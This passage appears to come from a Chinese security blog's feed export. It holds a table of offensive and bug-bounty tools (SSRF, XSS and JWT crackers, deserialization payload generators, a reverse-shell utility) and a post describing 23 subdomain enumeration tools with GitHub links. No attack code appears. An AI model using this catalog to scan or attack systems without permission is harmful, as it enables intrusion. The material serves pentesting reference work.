port</td></tr><tr><td>Scanner/SSRF</td><td align="left"><a href="https://github.com/swisskyrepo/SSRFmap" target="_blank" rel="noopener">SSRFmap</a></td><td align="center">Automatic SSRF fuzzer and exploitation tool</td></tr><tr><td>Scanner/SSRF</td><td align="left"><a href="https://github.com/teknogeek/ssrf-sheriff" target="_blank" rel="noopener">ssrf-sheriff</a></td><td align="center">A simple SSRF-testing sheriff written in Go</td></tr><tr><td>Scanner/WP</td><td align="left"><a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">wpscan</a></td><td align="center">WPScan is a free, for non-commercial use, black box WordPress Vulnerability Scanner written for security professionals and blog maintainers to test the security of their WordPress websites.</td></tr><tr><td>Scanner/WVS</td><td align="left"><a href="https://github.com/s0md3v/Striker" target="_blank" rel="noopener">Striker</a></td><td align="center">Striker is an offensive information and vulnerability scanner.</td></tr><tr><td>Scanner/WVS</td><td align="left"><a href="https://github.com/Arachni/arachni" target="_blank" rel="noopener">arachni</a></td><td align="center">Web Application Security Scanner Framework</td></tr><tr><td>Scanner/WVS</td><td align="left"><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">nikto</a></td><td align="center">Nikto web server scanner</td></tr><tr><td>Scanner/WVS</td><td align="left"><a href="https://github.com/skavngr/rapidscan" target="_blank" rel="noopener">rapidscan</a></td><td align="center">The Multi-Tool Web Vulnerability Scanner.</td></tr><tr><td>Scanner/WVS</td><td align="left"><a href="https://github.com/Grunny/zap-cli" target="_blank" rel="noopener">zap-cli</a></td><td align="center">A simple tool for interacting with OWASP ZAP from the commandline.</td></tr><tr><td>Scanner/XSS</td><td align="left"><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">XSStrike</a></td><td align="center">Most advanced XSS scanner.</td></tr><tr><td>Scanner/XSS</td><td align="left"><a href="https://github.com/hahwul/XSpear" target="_blank" rel="noopener">XSpear</a></td><td align="center">Powerfull XSS Scanning and Parameter analysis tool&amp;gem</td></tr><tr><td>Scanner/XSS</td><td align="left"><a href="https://github.com/hahwul/dalfox" target="_blank" rel="noopener">dalfox</a></td><td align="center"><g-emoji class="g-emoji" alias="waning_crescent_moon" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f318.png">🌘</g-emoji><g-emoji class="g-emoji" alias="fox_face" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f98a.png">🦊</g-emoji> DalFox(Finder Of XSS) / Parameter Analysis and XSS Scanning tool based on golang</td></tr><tr><td>Scanner/XSS</td><td align="left"><a href="https://github.com/fcavallarin/domdig" target="_blank" rel="noopener">domdig</a></td><td align="center">DOM XSS scanner for Single Page Applications</td></tr><tr><td>Scanner/XSS</td><td align="left"><a href="https://github.com/ssl/ezXSS" target="_blank" rel="noopener">ezXSS</a></td><td align="center">ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting.</td></tr><tr><td>Scanner/XSS</td><td align="left"><a href="https://github.com/dwisiswant0/findom-xss" target="_blank" rel="noopener">findom-xss</a></td><td align="center">A fast DOM based XSS vulnerability scanner with simplicity.</td></tr><tr><td>Scanner/XSS</td><td align="left"><a href="https://github.com/epsylon/xsser" target="_blank" rel="noopener">xsser</a></td><td align="center">Cross Site "Scripter" (aka XSSer) is an automatic -framework- to detect, exploit and report XSS vulnerabilities in web-based applications.</td></tr><tr><td>ToolBox/ALL</td><td align="left"><a href="https://github.com/m4ll0k/Bug-Bounty-Toolz" target="_blank" rel="noopener">Bug-Bounty-Toolz</a></td><td align="center">BBT - Bug Bounty Tools</td></tr><tr><td>ToolBox/ALL</td><td align="left"><a href="https://github.com/gchq/CyberChef" target="_blank" rel="noopener">CyberChef</a></td><td align="center">The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis</td></tr><tr><td>ToolBox/ALL</td><td align="left"><a href="https://github.com/tomnomnom/hacks" target="_blank" rel="noopener">hacks</a></td><td align="center">A collection of hacks and one-off scripts</td></tr><tr><td>ToolBox/ALL</td><td align="left"><a href="https://github.com/gwen001/pentest-tools" target="_blank" rel="noopener">pentest-tools</a></td><td align="center">Custom pentesting tools</td></tr><tr><td>Utility/B-ADDON</td><td align="left"><a href="https://github.com/fransr/postMessage-tracker" target="_blank" rel="noopener">postMessage-tracker</a></td><td align="center">A Chrome Extension to track postMessage usage (url, domain and stack) both by logging using CORS and also visually as an extension-icon</td></tr><tr><td>Utility/BRIDGE</td><td align="left"><a href="https://github.com/m4ll0k/Atlas" target="_blank" rel="noopener">Atlas</a></td><td align="center">Quick SQLMap Tamper Suggester</td></tr><tr><td>Utility/CALLBACK</td><td align="left"><a href="https://github.com/ArturSS7/TukTuk" target="_blank" rel="noopener">TukTuk</a></td><td align="center">Tool for catching and logging different types of requests.</td></tr><tr><td>Utility/CALLBACK</td><td align="left"><a href="https://github.com/allyomalley/dnsobserver" target="_blank" rel="noopener">dnsobserver</a></td><td align="center">A handy DNS service written in Go to aid in the detection of several types of blind vulnerabilities. It monitors a pentester's server for out-of-band DNS interactions and sends lookup notifications via Slack.</td></tr><tr><td>Utility/CRACK</td><td align="left"><a href="https://github.com/hashcat/hashcat/" target="_blank" rel="noopener">hashcat</a></td><td align="center">World's fastest and most advanced password recovery utility</td></tr><tr><td>Utility/CSP</td><td align="left"><a href="https://csp-evaluator.withgoogle.com" rel="noopener" target="_blank">CSP Evaluator</a></td><td align="center">Online CSP Evaluator from google</td></tr><tr><td>Utility/ENV</td><td align="left"><a href="https://github.com/1ndianl33t/Gf-Patterns" target="_blank" rel="noopener">Gf-Patterns</a></td><td align="center">GF Paterns For (ssrf,RCE,Lfi,sqli,ssti,idor,url redirection,debug_logic) parameters grep</td></tr><tr><td>Utility/ENV</td><td align="left"><a href="https://github.com/nahamsec/recon_profile" target="_blank" rel="noopener">recon_profile</a></td><td align="center">Recon profile (bash profile) for bugbounty</td></tr><tr><td>Utility/ETC</td><td align="left"><a href="https://www.hahwul.com/p/phoenix.html" rel="noopener" target="_blank">Phoenix</a></td><td align="center">hahwul's online tools</td></tr><tr><td>Utility/FIND</td><td align="left"><a href="https://github.com/junegunn/fzf" target="_blank" rel="noopener">fzf</a></td><td align="center">A command-line fuzzy finder</td></tr><tr><td>Utility/FLOW</td><td align="left"><a href="https://sequencediagram.org" rel="noopener" target="_blank">SequenceDiagram</a></td><td align="center">Online tool for creating UML sequence diagrams</td></tr><tr><td>Utility/GREP</td><td align="left"><a href="https://github.com/tomnomnom/gf" target="_blank" rel="noopener">gf</a></td><td align="center">A wrapper around grep, to help you grep for things</td></tr><tr><td>Utility/JSON</td><td align="left"><a href="https://github.com/tomnomnom/gron" target="_blank" rel="noopener">gron</a></td><td align="center">Make JSON greppable!</td></tr><tr><td>Utility/JWT</td><td align="left"><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a></td><td align="center">JWT brute force cracker written in C</td></tr><tr><td>Utility/JWT</td><td align="left"><a href="https://github.com/lmammino/jwt-cracker" target="_blank" rel="noopener">jwt-cracker</a></td><td align="center">Simple HS256 JWT token brute force cracker</td></tr><tr><td>Utility/JWT</td><td align="left"><a href="https://github.com/hahwul/jwt-hack" target="_blank" rel="noopener">jwt-hack</a></td><td align="center"><g-emoji class="g-emoji" alias="nut_and_bolt" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f529.png">🔩</g-emoji> jwt-hack is tool for hacking / security testing to JWT. Supported for En/decoding JWT, Generate payload for JWT attack and very fast cracking(dict/brutefoce)</td></tr><tr><td>Utility/PAYLOAD</td><td align="left"><a href="https://github.com/NotSoSecure/Blacklist3r" target="_blank" rel="noopener">Blacklist3r</a></td><td align="center">project-blacklist3r</td></tr><tr><td>Utility/PAYLOAD</td><td align="left"><a href="https://github.com/1N3/Findsploit" target="_blank" rel="noopener">Findsploit</a></td><td align="center">Find exploits in local and online databases instantly</td></tr><tr><td>Utility/PAYLOAD</td><td align="left"><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">Gopherus</a></td><td align="center">This tool generates gopher link for exploiting SSRF and gaining RCE in various servers</td></tr><tr><td>Utility/PAYLOAD</td><td align="left"><a href="https://github.com/1N3/IntruderPayloads" target="_blank" rel="noopener">IntruderPayloads</a></td><td align="center">A collection of Burpsuite Intruder payloads, BurpBounty payloads, fuzz lists, malicious file uploads and web pentesting methodologies and checklists.</td></tr><tr><td>Utility/PAYLOAD</td><td align="left"><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">PayloadsAllTheThings</a></td><td align="center">A list of useful payloads and bypass for Web Application Security and Pentest/CTF</td></tr><tr><td>Utility/PAYLOAD</td><td align="left"><a href="https://github.com/dwisiswant0/hinject" target="_blank" rel="noopener">hinject</a></td><td align="center">Host Header Injection Checker</td></tr><tr><td>Utility/PAYLOAD</td><td align="left"><a href="https://github.com/BuffaloWill/oxml_xxe" target="_blank" rel="noopener">oxml_xxe</a></td><td align="center">A tool for embedding XXE/XML exploits into different filetypes</td></tr><tr><td>Utility/PAYLOAD</td><td align="left"><a href="https://github.com/PortSwigger/xss-cheatsheet-data" target="_blank" rel="noopener">xss-cheatsheet-data</a></td><td align="center">This repository contains all the XSS cheatsheet data to allow contributions from the community.</td></tr><tr><td>Utility/PAYLOAD</td><td align="left"><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a></td><td align="center">A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.</td></tr><tr><td>Utility/PAYLOAD</td><td align="left"><a href="https://github.com/pwntester/ysoserial.net" target="_blank" rel="noopener">ysoserial.net</a></td><td align="center">Deserialization payload generator for a variety of .NET formatters</td></tr><tr><td>Utility/PENTEST</td><td align="left"><a href="https://github.com/pry0cc/axiom" target="_blank" rel="noopener">axiom</a></td><td align="center">A dynamic infrastructure toolkit for red teamers and bug bounty hunters!</td></tr><tr><td>Utility/PENTEST</td><td align="left"><a href="https://github.com/cytopia/pwncat" target="_blank" rel="noopener">pwncat</a></td><td align="center">pwncat - netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and port forwarding magic - and its fully scriptable with Python (PSE)</td></tr><tr><td>Utility/S3</td><td align="left"><a href="https://github.com/hahwul/s3reverse" target="_blank" rel="noopener">s3reverse</a></td><td align="center">The format of various s3 buckets is convert in one format. for bugbounty and security testing.</td></tr><tr><td>Utility/SHOT</td><td align="left"><a href="https://github.com/sensepost/gowitness" target="_blank" rel="noopener">gowitness</a></td><td align="center"><g-emoji class="g-emoji" alias="mag" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f50d.png">🔍</g-emoji> gowitness - a golang, web screenshot utility using Chrome Headless</td></tr><tr><td>Utility/SNIPPET</td><td align="left"><a href="https://github.com/knqyf263/pet" target="_blank" rel="noopener">pet</a></td><td align="center">Simple command-line snippet manager, written in Go.</td></tr><tr><td>Utility/TEMPLATE</td><td align="left"><a href="https://github.com/fransr/bountyplz" target="_blank" rel="noopener">bountyplz</a></td><td align="center">Automated security reporting from markdown templates (HackerOne and Bugcrowd are currently the platforms supported)</td></tr><tr><td>Utility/TEMPLATE</td><td align="left"><a href="https://github.com/fransr/template-generator" target="_blank" rel="noopener">template-generator</a></td><td align="center">A simple variable based template editor using handlebarjs+strapdownjs. The idea is to use variables in markdown based files to easily replace the variables with content. Data is saved temporarily in local storage. PHP is only needed to generate the list of files in the dropdown of templates.</td></tr><tr><td>Utility/URL</td><td align="left"><a href="https://github.com/tomnomnom/anew" target="_blank" rel="noopener">anew</a></td><td align="center">A tool for adding new lines to files, skipping duplicates</td></tr><tr><td>Utility/URL</td><td align="left"><a href="https://github.com/tomnomnom/burl" target="_blank" rel="noopener">burl</a></td><td align="center">A Broken-URL Checker</td></tr><tr><td>Utility/URL</td><td align="left"><a href="https://github.com/dwisiswant0/cf-check" target="_blank" rel="noopener">cf-check</a></td><td align="center">Cloudflare Checker written in Go</td></tr><tr><td>Utility/URL</td><td align="left"><a href="https://github.com/lc/gau" target="_blank" rel="noopener">gau</a></td><td align="center">Fetch known URLs from AlienVault's Open Threat Exchange, the Wayback Machine, and Common Crawl.</td></tr><tr><td>Utility/URL</td><td align="left"><a href="https://github.com/tomnomnom/qsreplace" target="_blank" rel="noopener">qsreplace</a></td><td align="center">Accept URLs on stdin, replace all query string values with a user-supplied value</td></tr><tr><td>Utility/URL</td><td align="left"><a href="https://github.com/tomnomnom/unfurl" target="_blank" rel="noopener">unfurl</a></td><td align="center">Pull out bits of URLs provided on stdin</td></tr><tr><td>Utility/URL</td><td align="left"><a href="https://github.com/1ndianl33t/urlprobe" target="_blank" rel="noopener">urlprobe</a></td><td align="center">Urls status code &amp; content length checker</td></tr><tr><td>Utility/WORD</td><td align="left"><a href="https://github.com/assetnote/wordlists" target="_blank" rel="noopener">wordlists</a></td><td align="center">Automated &amp; Manual Wordlists provided by Assetnote</td></tr><tr><td>Utility/WORD</td><td align="left"><a href="https://github.com/internetwache/CT_subdomains" target="_blank" rel="noopener">CT_subdomains</a></td><td align="center">An hourly updated list of subdomains gathered from certificate transparency logs</td></tr><tr><td>Utility/WORD</td><td align="left"><a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">SecLists</a></td><td align="center">SecLists is the security tester's companion. It's a collection of multiple types of lists used during security assessments, collected in one place. List types include usernames, passwords, URLs, sensitive data patterns, fuzzing payloads, web shells, and many more.</td></tr><tr><td>Utility/WORD</td><td align="left"><a href="https://github.com/emadshanab/subs_all" target="_blank" rel="noopener">subs_all</a></td><td align="center">Subdomain Enumeration Wordlist. 8956437 unique words. Updated.</td></tr></tbody></table><hr><p><strong>欢迎在文章最后评论区【留言和讨论】，当然，欢迎点击文章最后的打赏按键，请博主一杯冰阔乐，笑～</strong></p><table>  <tbody><tr>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/alipay.bmp"></td>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/wechat.bmp"></td>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/zan.png"></td>     </tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 黑客工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 黑客工具 </tag>
            
            <tag> 黑客 (Hacker) </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>23款子域名枚举工具</title>
      <link href="/archives/5c227977.html"/>
      <url>/archives/5c227977.html</url>
      
        <content type="html"><![CDATA[<h1 id="01-theHarvester"><a href="#01-theHarvester" class="headerlink" title="01_theHarvester"></a>01_theHarvester</h1><ul><li>一种非常简单但有效的扫描工具，用于渗透测试的早期阶段。使用它进行开源情报收集，并帮助确定外部威胁情况。该工具使用多个公共数据源收集 电子邮件、名称、子域、IP 和 URL。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-02.jpg" alt=""></p></blockquote><h1 id="v02-Amass"><a href="#v02-Amass" class="headerlink" title="v02_Amass"></a>v02_Amass</h1><ul><li>一个深度子域名枚举工具，可帮助信息安全专业人员使用开源信息收集和主动侦察技术来执行攻击面的网络映射并执行外部资产发现。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/OWASP/Amass" target="_blank" rel="noopener">https://github.com/OWASP/Amass….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-03.jpg" alt=""></p></blockquote><h1 id="03-subDomainsBrute"><a href="#03-subDomainsBrute" class="headerlink" title="03_subDomainsBrute"></a>03_subDomainsBrute</h1><ul><li>是一个用于渗透测试目标域名收集。高并发 DNS 暴力枚举，发现其他工具无法探测到的域名, 如 Google，aizhan，fofa。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-04.png" alt=""></p></blockquote><h1 id="04-OneForAll"><a href="#04-OneForAll" class="headerlink" title="04_OneForAll"></a>04_OneForAll</h1><ul><li>OneForAll 是一款功能强大的子域收集工具。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/shmilylty/OneForAll" target="_blank" rel="noopener">https://github.com/shmilylty/OneForAll….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-05.jpg" alt=""></p></blockquote><h1 id="05-Horn3t"><a href="#05-Horn3t" class="headerlink" title="05_Horn3t"></a>05_Horn3t</h1><ul><li>它基于出色的Sublist3r框架（或可扩展为您喜欢的框架），可搜索子域并生成出色的图片预览。使用http状态代码快速了解目标，添加自定义的发现子域，并一键直接访问找到的URL。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/janniskirschner/horn3t" target="_blank" rel="noopener">https://github.com/janniskirschner/horn3t….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-06.jpg" alt=""></p></blockquote><h1 id="06-SubBrute"><a href="#06-SubBrute" class="headerlink" title="06_SubBrute"></a>06_SubBrute</h1><ul><li>一个 DNS 查询扫描器，枚举 DNS 记录和子域。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute….</a></p></blockquote><h1 id="07-Knock"><a href="#07-Knock" class="headerlink" title="07_Knock"></a>07_Knock</h1><ul><li>它是一个 python 工具，通过单词列表枚举目标域上的子域。扫描 DNS 区域传输，并尝试自动启用通配符 DNS 记录。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/guelfoweb/knock" target="_blank" rel="noopener">https://github.com/guelfoweb/knock….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-07.jpg" alt=""></p></blockquote><h1 id="08-Sublist3r"><a href="#08-Sublist3r" class="headerlink" title="08_Sublist3r"></a>08_Sublist3r</h1><ul><li>Sublist3r 是一个 python 工具，旨在使用 OSINT 枚举网站的子域。它可以帮助渗透测试人员和 挖洞大佬 收集和收集他们所针对的域的子域。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-08.jpg" alt=""></p></blockquote><h1 id="09-dnssearch"><a href="#09-dnssearch" class="headerlink" title="09_dnssearch"></a>09_dnssearch</h1><ul><li>一款纯粹的子域枚举工具。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/evilsocket/dnssearch" target="_blank" rel="noopener">https://github.com/evilsocket/dnssearch….</a></p></blockquote><h1 id="10-Aquatone"><a href="#10-Aquatone" class="headerlink" title="10_Aquatone"></a>10_Aquatone</h1><ul><li>它是用于对大量主机上的网站进行视觉检查的工具，可方便快速地了解基于 HTTP 的攻击面。（简而言之就是个子域名挖掘器）</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/michenriksen/aquatone" target="_blank" rel="noopener">https://github.com/michenriksen/aquatone….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-10.jpg" alt=""></p></blockquote><h1 id="11-wydomain"><a href="#11-wydomain" class="headerlink" title="11_wydomain"></a>11_wydomain</h1><ul><li>一款专注于全面精准的子域名枚举工具。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-11.png" alt=""></p></blockquote><h1 id="12-Dumb"><a href="#12-Dumb" class="headerlink" title="12_Dumb"></a>12_Dumb</h1><ul><li>一款暴力破解子域名工具，快速且灵活。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/giovanifss/Dumb" target="_blank" rel="noopener">https://github.com/giovanifss/Dumb….</a></p></blockquote><h1 id="13-Subfinder"><a href="#13-Subfinder" class="headerlink" title="13_Subfinder"></a>13_Subfinder</h1><ul><li>Subfinder是一个子域发现工具，可发现网站的有效子域。设计为被动框架，可用于漏洞赏金和安全的渗透测试。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/projectdiscovery/subfinder" target="_blank" rel="noopener">https://github.com/projectdiscovery/subfinder….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-13.jpg" alt=""></p></blockquote><h1 id="14-ESD"><a href="#14-ESD" class="headerlink" title="14_ESD"></a>14_ESD</h1><ul><li>一款支持泛解析域名的高速域名扫描器。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/FeeiCN/ESD" target="_blank" rel="noopener">https://github.com/FeeiCN/ESD….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-14.jpg" alt=""></p></blockquote><h1 id="15-Subfinder"><a href="#15-Subfinder" class="headerlink" title="15_Subfinder"></a>15_Subfinder</h1><ul><li>一个汇集了 7 种 API 的子域发现工具，可通过使用被动的在线资源来发现网站的有效子域。它具有简单的模块化架构，并针对速度进行了优化。subfinder 仅用于做一件事，那就是被动子域枚举。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/projectdiscovery/subfinder" target="_blank" rel="noopener">https://github.com/projectdiscovery/subfinder….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-15.jpg" alt=""></p></blockquote><h1 id="16-DNSBrute"><a href="#16-DNSBrute" class="headerlink" title="16_DNSBrute"></a>16_DNSBrute</h1><ul><li>一个快速的子域名爆破工具。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/Q2h1Cg/dnsbrute" target="_blank" rel="noopener">https://github.com/Q2h1Cg/dnsbrute….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-16.jpg" alt=""></p></blockquote><h1 id="17-Anubis"><a href="#17-Anubis" class="headerlink" title="17_Anubis"></a>17_Anubis</h1><ul><li>Anubis 是一个子域枚举和信息收集工具。Anubis 整理来自各种来源的数据，包括HackerTarget，DNSDumpster，x509证书，VirusTotal，Google，Pkey和NetCraft。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/jonluca/Anubis" target="_blank" rel="noopener">https://github.com/jonluca/Anubis….</a></p></blockquote><h1 id="18-Altdns"><a href="#18-Altdns" class="headerlink" title="18_Altdns"></a>18_Altdns</h1><ul><li>Altdns 是一个 DNS 侦查工具，它允许发现符合模式的子域。Altdns 接收可能存在于某个域下的子域中的单词（例如 test，staging，dev），并吸收您所知道的子域列表。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-18.jpg" alt=""></p></blockquote><h1 id="19-Subdomain3"><a href="#19-Subdomain3" class="headerlink" title="19_Subdomain3"></a>19_Subdomain3</h1><ul><li>它是新一代子域名爆破工具，它帮助渗透测试者相比与其他工具更快发现更多的信息，这些信息包括子域名、IP、CDN 信息等。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/yanxiu0614/subdomain3" target="_blank" rel="noopener">https://github.com/yanxiu0614/subdomain3….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-19.jpg" alt=""></p></blockquote><h1 id="20-Domained"><a href="#20-Domained" class="headerlink" title="20_Domained"></a>20_Domained</h1><ul><li>domained 使用几个子域枚举工具和单词列表来创建唯一的子域列表，这些子域将传递给 EyeWitness，以使用分类的屏幕截图，服务器响应标头和基于签名的默认凭据检查进行报告。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/TypeError/domained" target="_blank" rel="noopener">https://github.com/TypeError/domained….</a></p></blockquote><h1 id="21-Teemo"><a href="#21-Teemo" class="headerlink" title="21_Teemo"></a>21_Teemo</h1><ul><li>提莫(teemo)是个侦察兵，域名的收集如同渗透和漏洞挖掘的侦察，故命名为提莫（Teemo）！</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/bit4woo/teemo" target="_blank" rel="noopener">https://github.com/bit4woo/teemo….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-21.jpg" alt=""></p></blockquote><h1 id="22-Sudomy"><a href="#22-Sudomy" class="headerlink" title="22_Sudomy"></a>22_Sudomy</h1><ul><li>一个子域枚举工具，使用 bash 脚本创建，可以快速，全面地分析域并收集子域。可以以 HTML 或 CSV 格式报告输出。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/screetsec/Sudomy" target="_blank" rel="noopener">https://github.com/screetsec/Sudomy….</a></p></blockquote><h1 id="23-DNSMaper"><a href="#23-DNSMaper" class="headerlink" title="23_DNSMaper"></a>23_DNSMaper</h1><ul><li>DNSMaper 拥有与众多子域名枚举工具相似的功能,诸如域传送漏洞检测、子域名枚举、IP地址获取，并且还有服务器WEBServer版本探测、网站标题获取、经纬度获取与GoogleMap生成的功能。</li></ul><blockquote><p>项目地址：<a href="https://link.zhihu.com/?target=https%3A//github.com/le4f/dnsmaper" target="_blank" rel="noopener">https://github.com/le4f/dnsmaper….</a><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/23-subdomain-enumeration-tools-23.jpg" alt=""></p></blockquote><hr><p><strong>欢迎在文章最后评论区【留言和讨论】，当然，欢迎点击文章最后的打赏按键，请博主一杯冰阔乐，笑～</strong></p><table>  <tbody><tr>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/alipay.bmp"></td>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/wechat.bmp"></td>    <td><img width="100" src="https://cdn.jsdelivr.net/gh//SpadeZ-A/cdn/img/zan.png"></td>     </tr></tbody></table><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            